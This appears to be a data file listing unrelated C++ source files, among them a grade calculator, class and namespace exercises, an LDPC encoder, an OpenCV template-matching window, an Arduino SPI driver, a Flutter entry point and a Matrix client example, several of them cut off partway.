    "#include <iostream>\n#include <string>\n#include <fstream>\n#include <sstream>\n\nusing namespace std;\n\n// Class for Student marks\nclass Student\n{\n    private:\n        string name;\n        int quiz1, quiz2, midTermExam, finalExam;\n\n    public:\n        // Constructor\n        Student() {\n            name = \"\";\n            quiz1 = 0;\n            quiz2 = 0;\n            midTermExam = 0;\n            finalExam = 0;\n        }\n\n        // Setter for name\n        void setName(const string& newName) {\n            name = newName;\n        }\n\n        // Getter for name\n        string getName() const {\n            return name;\n        }\n\n        // Setter for quiz1\n        void setQuiz1Result(const int& value) {\n            quiz1 = value;\n        }\n\n        // Getter for quiz1\n        int getQuiz1() const {\n            return quiz1;\n        }\n\n        // Setter for quiz2\n        void setQuiz2Result(const int& value) {\n            quiz2 = value;\n        }\n\n        // Getter for quiz2\n        int getQuiz2() const {\n            return quiz2;\n        }\n\n        // Setter for midTermExam\n        void setMidTermExamResult(const int& value) {\n            midTermExam = value;\n        }\n\n        // Getter for midTermExam\n        int getMidTermExam() const {\n            return midTermExam;\n        }\n\n        // Setter for finalExam\n        void setFinalExamResult(const int& value) {\n            finalExam = value;\n        }\n\n        // Getter for finalExam\n        int getFinalExam() const {\n            return finalExam;\n        }\n\n        // Member function that calculates and returns the student\ufffds weighted average\n        double calculateWeightAverage() const {\n            double quizAverage, quizWeightResult, finalExamWeightResult, midTermWeightResult, weightedAverage;\n            // The final exam counts for 50% of the grade\n            finalExamWeightResult = finalExam * 0.50;\n\n            // The midterm counts for 25%\n            midTermWeightResult = midTermExam * 0.25;\n\n            double quiz1Double = quiz1;\n            quizAverage = ((quiz1Double + quiz2) / 20) * 100;\n            quizWeightResult = quizAverage * 0.25;\n\n            // Calculate the weighted average\n            weightedAverage = finalExamWeightResult + midTermWeightResult + quizWeightResult;\n            return weightedAverage;\n        }\n\n        friend istream& operator>>(istream& in, Student& student);\n        friend ostream& operator<<(ostream& os, const Student &student);\n};\n\nistream& operator>>(istream& in, Student& student) {\n    string line;\n    getline(in, line);\n    istringstream iss(line);\n    string name, surname, fullname;\n    int quiz1, quiz2, midTermExam, finalExam;\n\n    iss >> name >> surname >> quiz1 >> quiz2 >> midTermExam >> finalExam;\n\n    fullname = name + \" \" + surname;\n    student.setName(fullname);\n    student.setQuiz1Result(quiz1);\n    student.setQuiz2Result(quiz2);\n    student.setMidTermExamResult(midTermExam);\n    student.setFinalExamResult(finalExam);\n\n    return in;\n}\n\nostream& operator<<(ostream& os, const Student &student) {\n    os << \"Student name: \" << student.name << \"\\n\"\n        << \"Applemac Quiz 1: \" << student.quiz1 << \"\\n\"\n        << \"Quiz 2: \" << student.quiz2 << \"\\n\"\n        << \"Midterm exam: \" << student.midTermExam << \"\\n\"\n        << \"Final exam: \" << student.finalExam << \"\\n\"\n        << \"Average numeric score: \" << student.calculateWeightAverage() << \"%\" << \"\\n\";\n    return os;\n};\n\nint main()\n{\n    int curr_count = 0, max_students = 20;\n    Student students[max_students];\n\n    ifstream inStream;\n    inStream.open(\"Student.dat\");\n    if (!inStream) {\n        cout << \"Unable to open file\";\n        exit(1); // terminate with error\n    }\n\n    if (inStream.is_open()) {\n        while (curr_count < max_students && inStream >> students[curr_count]) {\n            ++curr_count;\n        }\n        inStream.close();\n    }\n\n    double totalAverage = 0.0;\n\n    for (int i = 0; i < curr_count; ++i) {\n        cout << students[i] << endl;\n        totalAverage += students[i].calculateWeightAverage();\n    }\n\n    if (curr_count > 0) {\n        double classAverage = totalAverage / curr_count;\n        cout << \"Class Average: \" << classAverage << \"%\" << endl;\n    }\n\n    return 0;\n}\n",
    "//#define _CRT_SECURE_NO_WARNINGS 1\n//\n//#include <stdio.h>\n//#include <stdlib.h>\n//\n// //\u5b9a\u4e49\u547d\u540d\u7a7a\u95f4 wnadou\n//namespace wandou\n//{\n//    int rand = 10;\n//    int Add(int left, int right)\n//    {\n//        return left + right;\n//    }\n//    struct Node\n//    {\n//        Node* next;\n//        int val;\n//    };\n//}\n//\n//int main()\n//{\n//    printf(\"%p\\n\", rand); // \u9ed8\u8ba4\u8bbf\u95ee\u7684\u662f\u5168\u5c40\u7684rand\n//    printf(\"%d\\n\", wandou::rand); // \u6307\u5b9a\u8bbf\u95ee wandou \u547d\u540d\u7a7a\u95f4\u4e2d\u7684 rand\n//    return 0;\n//}\n//\n//namespace wandou\n//{\n//    namespace wd\n//    {\n//        int rand = 1;\n//        int Add(int left, int right)\n//        {\n//            return left + right;\n//        }\n//    }\n//}\n//\n//#include <iostream>\n//\n//int main()\n//{\n//    std::cout << \"Hello, World!\" << std::endl;  // \u8f93\u51fa\u5b57\u7b26\u4e32\n//    int a = 10;\n//    std::cout << \"a = \" << a << std::endl;  // \u8f93\u51fa\u53d8\u91cf\u503c\n//    double b = 3.14;\n//    std::cout << \"b = \" << b << std::endl;  // \u8f93\u51fa\u6d6e\u70b9\u6570\u503c\n//    return 0;\n//}\n//\n//#include <iostream>\n//\n//int main()\n//{\n//    int a;\n//    std::cout << \"\u8bf7\u8f93\u5165\u4e00\u4e2a\u6574\u6570: \";\n//    std::cin >> a;  // \u4ece\u6807\u51c6\u8f93\u5165\u8bfb\u53d6\u4e00\u4e2a\u6574\u6570\u5e76\u5b58\u50a8\u5230\u53d8\u91cfa\u4e2d\n//    std::cout << \"\u4f60\u8f93\u5165\u7684\u6574\u6570\u662f: \" << a << std::endl;\n//\n//    double b;\n//    std::cout << \"\u8bf7\u8f93\u5165\u4e00\u4e2a\u6d6e\u70b9\u6570: \";\n//    std::cin >> b;  // \u4ece\u6807\u51c6\u8f93\u5165\u8bfb\u53d6\u4e00\u4e2a\u6d6e\u70b9\u6570\u5e76\u5b58\u50a8\u5230\u53d8\u91cfb\u4e2d\n//    std::cout << \"\u4f60\u8f93\u5165\u7684\u6d6e\u70b9\u6570\u662f: \" << b << std::endl;\n//\n//    return 0;\n//}\n//\n//#include <iostream>\n//\n//void Print(int x = 10, int y = 20)\n//{\n//    std::cout << \"x = \" << x << \", y = \" << y << std::endl;\n//}\n//\n//int main()\n//{\n//    Print();            // \u8c03\u7528 Print()\uff0c\u4f7f\u7528\u9ed8\u8ba4\u503c x=10, y=20\n//    Print(5);           // \u8c03\u7528 Print(5)\uff0c\u4f7f\u7528\u9ed8\u8ba4\u503c y=20\n//    Print(5, 15);       // \u8c03\u7528 Print(5, 15)\uff0c\u4e0d\u4f7f\u7528\u9ed8\u8ba4\u503c\n//\n//    return 0;\n//}\n\n\n//\n//#include <iostream>\n//\n//// \u5b9a\u4e49\u591a\u4e2a\u91cd\u8f7d\u51fd\u6570\n//void Print(int x)\n//{\n//    \n//    std::cout << \"Print int: \" << x << std::endl;\n//}\n//void Print(double x)\n//{\n//    std::cout << \"Print double: \" << x << std::endl;\n//}\n//\n//void Print(int x, double y)\n//{\n//    std::cout << \"Print int and double: \" << x << \", \" << y << std::endl;\n//}\n//\n//int main()\n//{\n//    Print(5);           // \u8c03\u7528 Print(int)\n//    Print(5.5);         // \u8c03\u7528 Print(double)\n//    Print(5, 5.5);      // \u8c03\u7528 Print(int, double)\n//\n//    return 0;\n//}\n",
    "#include<iostream>\n#include<string>\nusing namespace std;\n\nclass Phone{\n    string _name = \"\";\n    string _os = \"\";\n    int _price = 0;\n\npublic:\n    Phone(); //default constructor\n    Phone(const string & name, const string & os, const int & price); //parameter constructor\n    Phone(const Phone &); // copy constructor\n    string getName(){\n        cout << \"value of getname is \"<<this<<endl;\n        return _os;\n    }\n    int getprice();\n    ~Phone(); //destructor\n\n};\n\nint Phone::getprice(){\n    cout << \"value of object is\" << this <<endl;\n    return _price;\n}\n\nPhone::Phone() : _name(),_os(\"Dev\"),_price(){\n    cout << \"Default constructor called\" << endl;\n}\n\nPhone::Phone(const string & name, const string & os, const int & price): _name(name),\n_os(os),_price(){\n    cout << \"Parameter constructor called\" << endl;\n}\n\nPhone::Phone(const Phone & values){\n    cout << \"Overwrite copy constructor\"<< endl;\n    _name = \"New-\"+values._name;\n    _os = \"skinned-\"+values._os;\n    _price = values._price;\n}\n\nPhone::~Phone(){\n    cout << \"Destructor called for \" << _name << endl;\n}\n\nint main(){\n    Phone samsungA1;\n    cout << samsungA1.getName() << endl;\n\n    Phone OnePlus(\"OP8\",\"Android\",799);\n    cout << OnePlus.getName() << endl;\n\n    cout << \"value of the object is \" << &OnePlus << endl;\n    cout << OnePlus.getprice() << endl;\n\n\n    Phone OnePlus8 = OnePlus;\n    cout << OnePlus8.getName() << endl;\n    cout << OnePlus8.getprice() << endl;\n\n    return 0;\n}\n",
    "#include \"LDPC.h\"\n#include <math.h>   \nusing namespace  std;\n\nnrLDPC::nrLDPC(size_t infoLen, double codeRate)\n{\n\tmKBar = infoLen;\n\tmR = codeRate;\n\n\t// select base graph based on 3GPP 38.212 7.2.2\n\tmBGn = selectBaseGraph(mKBar, mR);\n\n\t// select lifting size\n\tmZc = selectLiftSize(mKBar, mBGn);\n\n\t// select shifting set\n\tmSetIdx = selectShiftSet(mZc);\n\n\t// systematic bits length and parity bits length\n\tif (mBGn == 1) {\n\t\tmK = 22 * mZc; mN = 68 * mZc;\n\t}\n\telse {\n\t\tmK = 10 * mZc;  mN = 52 * mZc;\n\t}\n\n\t// fillers length\n\tmF = mK - mKBar;\n\n\t// build up edges and shifts\n\tif (mBGn == 1) {\n\t\tmEdges.reserve(316);\n\t\tfor (unsigned i = 0; i < 316; i++) {\n\t\t\tmEdges.push_back(edge_t());\n\t\t\tmEdges[i] = { shiftTableBgn_1[i][0],shiftTableBgn_1[i][1],uint16_t(shiftTableBgn_1[i][mSetIdx + 2] % mZc) };\n\t\t}\n\t}\n\telse {\n\t\tmEdges.reserve(197);\n\t\tfor (unsigned i = 0; i < 197; i++) {\n\t\t\tmEdges.push_back(edge_t());\n\t\t\tmEdges[i] = { shiftTableBgn_2[i][0],shiftTableBgn_2[i][1], uint16_t(shiftTableBgn_2[i][mSetIdx + 2] % mZc) };\n\t\t}\n\t}\n\n\t// build up layers\n\tif (mBGn == 1) {\n\t\tmLayers = { {0,19},{19,38},{38,57},{57,76},{76,79},{79,87},{87,96},{96,103},\n\t\t\t\t   {103,113},{113,122},{122,129},{129,137},{137,144},{144,150},{150,157},\n\t\t\t\t   {157,164},{164,170},{170,176},{176,182},{182,188},{188,194},{194,200},\n\t\t\t\t   {200,205},{205,210},{210,216},{216,221},{221,226},{226,230},{230,235},\n\t\t\t\t   {235,240},{240,245},{245,250},{250,255},{255,260},{260,265},{265,270},\n\t\t\t\t   {270,275},{275,279},{279,284},{284,289},{289,293},{293,298},{298,302},\n\t\t\t\t   {302,307},{307,312},{312,316} };\n\t}\n\telse {\n\t\tmLayers = { {0,8},{8,18},{18,26},{26,36},{36,40},{40,46},{46,52},\n\t\t\t\t   {52,58},{58,62},{62,67},{67,72},{72,77},{77,81},{81,86},\n\t\t\t\t   {86,91},{91,95},{95,100},{100,105},{105,109},{109,113},\n\t\t\t\t   {113,117},{117,121},{121,124},{124,128},{128,132},{132,135},\n\t\t\t\t   {135,140},{140,143},{143,147},{147,150},{150,155},{155,158},\n\t\t\t\t   {158,162},{162,166},{166,170},{170,174},{174,178},{178,181},\n\t\t\t\t   {181,185},{185,189},{189,193},{193,197} };\n\t}\n}\n\nvector<bool> nrLDPC::encode(const vector<bool>& msg)\n{\n\tsize_t  Kb, Cb, totLayers;\n\tif (mBGn == 1) {\n\t\tKb = 22; Cb = 68; totLayers = 46;\n\t}\n\telse {\n\t\tKb = 10; Cb = 52; totLayers = 42;\n\t}\n\n\tassert(Kb * mZc == msg.size());\n\n\t// initialize encoded bits in nodes(vectors of size Zc)\n\t// the first Kb nodes correspond to information bits, the rest  parity bits\n\tvector<vector<bool>> cWord(Cb);\n\tfor (unsigned i = 0; i < Kb; i++) {\n\t\tcWord[i] = vector<bool>(msg.begin() + i * mZc, msg.begin() + (i + 1) * mZc);\n\t}\n\tfor (unsigned i = Kb; i < Cb; i++) {\n\t\tcWord[i] = vector<bool>(mZc, 0);\n\t}\n\n\tuint16_t vNodeIdx, nShifts, shiftP0;\n\n\t// solve the first parity node P0\n\tfor (unsigned i = 0; i < 4; i++) {\n\t\tfor (unsigned edgeIdx = mLayers[i].edgeStart; edgeIdx < mLayers[i].edgeEnd; edgeIdx++) {\n\t\t\tvNodeIdx = mEdges[edgeIdx].vNodeIdx; nShifts = mEdges[edgeIdx].nShifts;\n\t\t\t// only count information bit nodes\n\t\t\tif (vNodeIdx < Kb) {\n\t\t\t\tcWord[Kb] = eleWiseXor(cWord[Kb], circShift(cWord[vNodeIdx], nShifts));\n\t\t\t}\n\t\t\t// find the shift coefficient of P0\n\t\t\tif (vNodeIdx == Kb && (i == 1 || i == 2)) {\n\t\t\t\tshiftP0 = nShifts;\n\t\t\t}\n\t\t}\n\t}\n\t// rotate back to get P0\n\trotate(cWord[Kb].begin(), cWord[Kb].begin() + (mZc - shiftP0), cWord[Kb].end());\n\n\t// solve P1,P2,P3\n\tfor (unsigned i = 0; i < 3; i++) {\n\t\tfor (unsigned edgeIdx = mLayers[i].edgeStart; edgeIdx < mLayers[i].edgeEnd; edgeIdx++) {\n\t\t\tvNodeIdx = mEdges[edgeIdx].vNodeIdx; nShifts = mEdges[edgeIdx].nShifts;\n\t\t\tif (vNodeIdx <= Kb + i) {\n\t\t\t\tcWord[Kb + i + 1] = eleWiseXor(cWord[Kb + i + 1], circShift(cWord[vNodeIdx], nShifts));\n\t\t\t}\n\t\t}\n\t}\n\t// solve the rest parity node\n\tfor (unsigned i = 4; i < totLayers; i++) {\n\t\t// not taking the last edge which corresponds the parity position\n\t\tfor (unsigned edgeIdx = mLayers[i].edgeStart; edgeIdx < mLayers[i].edgeEnd - 1; edgeIdx++) {\n\t\t\tvNodeIdx = mEdges[edgeIdx].vNodeIdx; nShifts = mEdges[edgeIdx].nShifts;\n\t\t\tcWord[Kb + i] = eleWiseXor(cWord[Kb + i], circShift(cWord[vNodeIdx], nShifts));\n\t\t}\n\t}\n\t// flatten codeword and return\n\tvector<bool> cWordVec;\n\tfor (auto vec : cWord) {\n\t\tcWordVec.insert(cWordVec.end(), vec.begin(), vec.end());\n\t}\n\treturn cWordVec;\n}\nvector<bool> nrLDPC::decode(const vector<double>& softBitsIn, const unsigned nMaxIter)\n{\n\t//------------------------------------------------------------------------------------------------------\n\t// [ref] Hocevar, D.E. \"A reduced complexity decoder architecture via layered decoding of LDPC codes.\"\n\t// In IEEE Workshop on Signal Processing Systems, 2004. SIPS 2004.\n\t//------------------------------------------------------------------------------------------------------\n\tassert(softBitsIn.size() == mN);\n\n\t// initialize LLR in blocks(nodes), each node with Zc bits\n\tvector<vector<double>> LLR(mN / mZc);\n\tfor (unsigned i = 0; i < mN / mZc; i++) {\n\t\tLLR[i] = vector<double>(softBitsIn.begin() + i * mZc, softBitsIn.begin() + (i + 1) * mZc);\n\t}\n\n\t// find how many parity nodes to use for decoding\n\tunsigned nMax",
    "// TESTE 05 - lista ligada \r\n\r\n#include \"linked_list.hpp\" // Inclui o cabe\u00e7alho da implementa\u00e7\u00e3o da lista ligada\r\n#include <iostream> // Inclui a biblioteca de entrada e sa\u00edda padr\u00e3o\r\n#include <chrono> // Inclui a biblioteca para medi\u00e7\u00e3o de tempo\r\n\r\nint main() {\r\n    linked_list myList; // Cria uma inst\u00e2ncia da lista ligada chamada myList\r\n    const int NUM_ELEMENTS = 10000; // Define uma constante para o n\u00famero de elementos a serem inseridos\r\n\r\n    // Popula a lista com elementos\r\n    for (int i = 0; i < NUM_ELEMENTS; ++i) { // Loop que itera de 0 at\u00e9 NUM_ELEMENTS - 1\r\n        myList.push_back(i); // Insere o elemento 'i' no final da lista\r\n    }\r\n\r\n    // Medir o tempo de execu\u00e7\u00e3o para remo\u00e7\u00f5es\r\n    auto start = std::chrono::high_resolution_clock::now(); // Marca o tempo inicial\r\n\r\n    // Remover elementos do final da lista\r\n    for (int i = 0; i < NUM_ELEMENTS; ++i) { // Loop que itera de 0 at\u00e9 NUM_ELEMENTS - 1\r\n        myList.pop_back();  // Remove o \u00faltimo elemento da lista\r\n    }\r\n\r\n    auto end = std::chrono::high_resolution_clock::now(); // Marca o tempo final\r\n    std::chrono::duration<double> duration = end - start; // Calcula a dura\u00e7\u00e3o da execu\u00e7\u00e3o\r\n\r\n    // Exibir o tempo de execu\u00e7\u00e3o\r\n    std::cout << \"Tempo de execu\u00e7\u00e3o: \" << duration.count() << \" segundos\" << std::endl; // Exibe o tempo de execu\u00e7\u00e3o em segundos\r\n\r\n    return 0; // Retorna 0, indicando que o programa foi executado com sucesso\r\n}\r\n",
    "\ufeff#pragma comment(linker,\"\\\"/manifestdependency:type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\\\"\")\n#ifdef _DEBUG\n#pragma comment(lib, \"opencv_world480d\")\n#else\n#pragma comment(lib, \"opencv_world480\")\n#endif\n#include <windows.h>\n#include \"opencv2/opencv.hpp\"\n\nusing namespace cv;\n\nTCHAR szClassName[] = TEXT(\"Window\");\n\nLRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)\n{\n\tstatic HWND hButton;\n\tstatic Mat src;\n\tswitch (msg)\n\t{\n\tcase WM_CREATE:\n\t\thButton = CreateWindow(TEXT(\"BUTTON\"), TEXT(\"\u5909\u63db\"), WS_VISIBLE | WS_CHILD, 0, 0, 0, 0, hWnd, (HMENU)IDOK, ((LPCREATESTRUCT)lParam)->hInstance, 0);\n\t\tbreak;\n\tcase WM_SIZE:\n\t\tMoveWindow(hButton, 10, 10, 256, 32, TRUE);\n\t\tbreak;\n\tcase WM_COMMAND:\n\t\tif (LOWORD(wParam) == IDOK)\n\t\t{\n\t\t\tsrc.release();\n\t\t\tMat tmpl, mapCC;\n\t\t\tsrc = imread(\"src.png\"); //\u5165\u529b\u753b\u50cf\n\t\t\t//tmpl = imread(\"find2.jpg\"); //\u63a2\u7d22\u753b\u50cf\uff08\u30c6\u30f3\u30d7\u30ec\u30fc\u30c8\uff09\n\t\t\ttmpl = imread(\"find.png\"); //\u63a2\u7d22\u753b\u50cf\uff08\u30c6\u30f3\u30d7\u30ec\u30fc\u30c8\uff09\n\t\t\t//\u63a2\u7d22\u51e6\u7406\uff08\u30c6\u30f3\u30d7\u30ec\u30fc\u30c8\u30de\u30c3\u30c1\u30f3\u30b0\uff09\n\t\t\tmatchTemplate(src, tmpl, mapCC, TM_CCOEFF_NORMED);\n\t\t\tdouble fMax; //\u76f8\u4e92\u76f8\u95a2\u306e\u6700\u5927\u5024\n\t\t\tPoint pos; //\u63a2\u7d22\u7d50\u679c\u306e\u4f4d\u7f6e\n\t\t\tminMaxLoc(mapCC, NULL, &fMax, NULL, &pos); //\u76f8\u4e92\u76f8\u95a2\u30de\u30c3\u30d7\u306e\u6700\u5927\u5024\u691c\u7d22\n\t\t\t//\u5165\u529b\u753b\u50cf\u306b\u63a2\u7d22\u7d50\u679c\u306e\u4f4d\u7f6e\u306b\u56db\u89d2\u3092\u63cf\u753b\n\t\t\trectangle(src, Rect(pos.x, pos.y, tmpl.cols, tmpl.rows), Scalar(255, 255, 255), 2);\n\t\t\tInvalidateRect(hWnd, 0, TRUE);\n\t\t}\n\t\tbreak;\n\tcase WM_PAINT:\n\t\t{\n\t\t\tPAINTSTRUCT ps;\n\t\t\tHDC hdc = BeginPaint(hWnd, &ps);\n\t\t\tif (!src.empty()) {\n\t\t\t\tSetDIBitsToDevice(hdc, 0, 0, src.cols, src.rows, 0, 0, 0, src.rows, src.data, (BITMAPINFO*)&BITMAPINFO { { sizeof(BITMAPINFOHEADER), src.cols, -src.rows, 1, (WORD)(src.channels() * 8), BI_RGB, 0, 0, 0, 0, 0 }, { 0,0,0,0 } }, DIB_RGB_COLORS);\n\t\t\t}\n\t\t\tEndPaint(hWnd, &ps);\n\t\t}\n\t\tbreak;\n\tcase WM_DESTROY:\n\t\tsrc.release();\n\t\tPostQuitMessage(0);\n\t\tbreak;\n\tdefault:\n\t\treturn DefWindowProc(hWnd, msg, wParam, lParam);\n\t}\n\treturn 0;\n}\n\nint WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPreInst, LPWSTR pCmdLine, int nCmdShow)\n{\n\tMSG msg;\n\tWNDCLASS wndclass = {\n\t\tCS_HREDRAW | CS_VREDRAW,\n\t\tWndProc,\n\t\t0,\n\t\t0,\n\t\thInstance,\n\t\t0,\n\t\tLoadCursor(0,IDC_ARROW),\n\t\t(HBRUSH)(COLOR_WINDOW + 1),\n\t\t0,\n\t\tszClassName\n\t};\n\tRegisterClass(&wndclass);\n\tHWND hWnd = CreateWindow(\n\t\tszClassName,\n\t\tTEXT(\"Window\"),\n\t\tWS_OVERLAPPEDWINDOW | WS_CLIPCHILDREN,\n\t\tCW_USEDEFAULT,\n\t\t0,\n\t\tCW_USEDEFAULT,\n\t\t0,\n\t\t0,\n\t\t0,\n\t\thInstance,\n\t\t0\n\t);\n\tShowWindow(hWnd, SW_SHOWDEFAULT);\n\tUpdateWindow(hWnd);\n\twhile (GetMessage(&msg, 0, 0, 0))\n\t{\n\t\tTranslateMessage(&msg);\n\t\tDispatchMessage(&msg);\n\t}\n\treturn (int)msg.wParam;\n}\n",
    "#include \"SpiClass.hpp\"\n\nuint8_t SpiClass::initialized = 0;\n\nSpiClass SPI;\n\nvoid SpiClass::begin(const uint8_t ss_pin,\n                      const uint8_t mosi_pin,\n                      const uint8_t miso_pin,\n                      const uint8_t sck_pin)\n{\n  uint8_t sreg = SREG;  // SREG is system call\n  noInterrupts();       // from <Arduino.h> Disables all interrupts by clearing the global interrupt mask\n  if (!initialized)     // initialized var is naturally false on startup, therefore, this means onStartup\n  {\n    // Set PIN_SPI_SS to high so a connected chip will be \"deselected\" by default\n    uint8_t port = digitalPinToPort(ss_pin);\n    uint8_t bit = digitalPinToBitMask(ss_pin);\n    volatile uint8_t *reg = portModeRegister(port);\n    // All the above 3 sentences are calling Arduino system. \n    // It seems like they are making Arduino drop any previous slave (SS)\n    // that it was currently connected to. It does this by setting the Pinout\n    // of our connected CAN module(PIN_SPI_SS) to high\n\n    // if the PIN_SPI_SS pin is not already configured as an output\n    // then set it high (to enable the internal pull-up resistor)\n    if(!(*reg & bit)){\n      digitalWrite(ss_pin, HIGH);\n    }\n\n    // When the PIN_SPI_SS pin is set as OUTPUT, it can be used as\n    // a general purpose output port (it doesn't influence\n    // SPI operations).\n    pinMode(ss_pin, OUTPUT);\n\n    // Warning: if the SS pin ever becomes a LOW INPUT then SPI\n    // automatically switches to Slave, so the data direction of\n    // the SS pin MUST be kept as OUTPUT.\n    SPCR |= _BV(MSTR);\n    SPCR |= _BV(SPE);\n\n    // Set direction register for SCK and MOSI pin.\n    // MISO pin automatically overrides to INPUT.\n    // By doing this AFTER enabling SPI, we avoid accidentally\n    // clocking in a single bit since the lines go directly\n    // from \"input\" to SPI control.\n    // http://code.google.com/p/arduino/issues/detail?id=888\n    pinMode(sck_pin, OUTPUT);\n    pinMode(mosi_pin, OUTPUT);\n    // I believe if we need to also set Master In, Slave out, We can also do it here\n  }\n  initialized++; // reference count\n  SREG = sreg;\n}\n",
    "#include \"ClapTrap.hpp\"\n#include <iostream>\n#include <climits>\n\n//Canonic form and constructors\n\nClapTrap::ClapTrap(void) : _name(\"Default\"), _hitPoints(10), _energyPoints(10), _attackDamage(10){\n\tstd::cout << \"ClapTrap default constructor called\" << std::endl;\n\treturn;\n}\n\nClapTrap::ClapTrap(const std::string &name) : _name(name), _hitPoints(10), _energyPoints(10), _attackDamage(0){\n\tstd::cout << \"ClapTrap name constructor \" << name << \" called\" << std::endl;\n\treturn;\n}\n\nClapTrap &ClapTrap::operator=(const ClapTrap &cpy){\n\t//std::cout << \"ClapTrap assign operator called\" << std::endl;\n\tthis->_hitPoints = cpy._hitPoints;\n\tthis->_energyPoints = cpy._energyPoints;\n\tthis->_attackDamage = cpy._attackDamage;\n\treturn (*this);\n}\n\nClapTrap::ClapTrap(const ClapTrap &src) : _name(src._name){\n\tstd::cout << \"ClapTrap copy constructor called\" << std::endl;\n\t*this = src;\n\treturn;\n}\n\nClapTrap::~ClapTrap(void){\n\tstd::cout << \"ClapTrap destructor called\" << std::endl;\n\treturn;\n}\n\n//Getters\n\nunsigned int\tClapTrap::getHitPoints(void){\n\treturn this->_hitPoints;\n}\nunsigned int\tClapTrap::getEnergyPoints(void){\n\treturn this->_energyPoints;\n}\nunsigned int\tClapTrap::getAttackDamage(void){\n\treturn this->_attackDamage;\n}\n\n//Actions member functions\n\nvoid\tClapTrap::attack(const std::string &target){\n\n\tif (_energyPoints < 1)\n\t{\n\t\tstd::cout << this->_name << \": Not enough energy points\" << std::endl;\n\t\treturn;\n\t}\n\n\tstd::cout << \"ClapTrap \" << this->_name << \" attacks \" << target << \", \"\n\t<< \"causing \" << this->_attackDamage << \" points of damage!\" << std::endl;\n\n\tthis->_energyPoints--;\n\n\treturn;\n}\n\nvoid\tClapTrap::beRepaired(unsigned int amount){\n\n\tlong long int longAmount = amount;\n\tif (_energyPoints < 1)\n\t{\n\t\tstd::cout << this->_name << \": Not enough energy points\" << std::endl;\n\t\treturn;\n\t}\n\tif (longAmount > UINT_MAX || (longAmount + this->_hitPoints) > UINT_MAX)\n\t\tamount = UINT_MAX - this->_hitPoints; // In this case, we change the amount because ClapTrap can not have more points than the unsigned int\n\n\tthis->_hitPoints += amount;\n\tthis->_energyPoints--;\n\n\tstd::cout << \"ClapTrap \" << this->_name << \" heals \" << amount << \" hit points\" << std::endl;\n}\n\nvoid\tClapTrap::takeDamage(unsigned int amount)\n{\n\tstd::cout << \"ClapTrap \" << this->_name << \" receives \" << amount << \" points of damage!\" << std::endl;\n\n\tif (amount >= this->_hitPoints)\n\t{\n\t\tstd::cout << \"Claptrap is dead.\" << std::endl;\n\t\tthis->_hitPoints = 0;\n\t\treturn ;\n\t}\n\n\tthis->_hitPoints -= amount;\n\n\treturn;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"namer_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"MatrixClient.h\"\n#include <memory>\n\n/**\n * just an example and for testing\n * purposes need a test account to test this\n * with\n * @param client\n * @return\n */\nauto run(std::shared_ptr<MatrixClient> client) -> boost::asio::awaitable<void> {\n    try {\n        co_await client->connect();\n\n        // Uncomment the desired login method\n        // Login with username and password\n        co_await client->password_login(\"your_username\", \"your_password\");\n\n        // Login with token\n        //co_await client->token_login(\"your_login_token\");\n        //std::cout << \"Logged in successfully\" << std::endl;\n\n        // Continue with other operations...\n\n    } catch (const std::exception& e) {\n        std::cerr << \"Exception: \" << e.what() << std::endl;\n    }\n}\n\nint main() {\n    std::string host = \"matrix.org\";\n    std::string port = \"443\";\n    boost::asio::io_context io_context;\n\n    auto client = std::make_shared<MatrixClient>(host, port, io_context);\n\n    boost::asio::co_spawn(io_context, run(client), boost::asio::detached);\n\n    io_context.run();\n\n    /**auto client = std::make_shared<MatrixClient>(host, port, io_context);\n    boost::asio::co_spawn(io_context, [&] -> boost::asio::awaitable<void> {\n        co_await client->connect();\n    }, boost::asio::detached);\n\n    io_context.run();**/\n\n    return 0;\n\n}\n\n",
    "#include\"xulychung.h\"\n\n\n/**\n* N\u1ea1p m\u1ed9t \u1ea3nh bitmap (BMP) v\u00e0o m\u1ed9t texture tr\u00ean thi\u1ebft b\u1ecb hi\u1ec7n th\u1ecb (rendering device)\n* @param file: \u0111\u01b0\u1eddng d\u1eabn v\u00e0 t\u00ean file \u1ea3nh BMP\n* @param ren: renderer \u0111\u1ec3 n\u1ea1p texture l\u00ean\n* @return tr\u1ea3 v\u1ec1 texture \u0111\u00e3 n\u1ea1p, ho\u1eb7c nullptr n\u1ebfu c\u00f3 l\u1ed7i.\n*/\nSDL_Texture* loadTexture(const std::string &file, SDL_Renderer *ren)\n{\n\t//Kh\u1edfi t\u1ea1o l\u00e0 nullptr \u0111\u1ec3 tr\u00e1nh l\u1ed7i 'dangling pointer'\n\tSDL_Texture *texture = nullptr;\n\t//N\u1ea1p \u1ea3nh t\u1eeb t\u00ean file (v\u1edbi \u0111\u01b0\u1eddng d\u1eabn)\n\tSDL_Surface *loadedImage = SDL_LoadBMP(file.c_str());\n\t//N\u1ebfu kh\u00f4ng c\u00f3 l\u1ed7i, chuy\u1ec3n \u0111\u1ed5i v\u1ec1 d\u1ea1ng texture and v\u00e0 tr\u1ea3 v\u1ec1\n\tif (loadedImage != nullptr){\n\t\ttexture = SDL_CreateTextureFromSurface(ren, 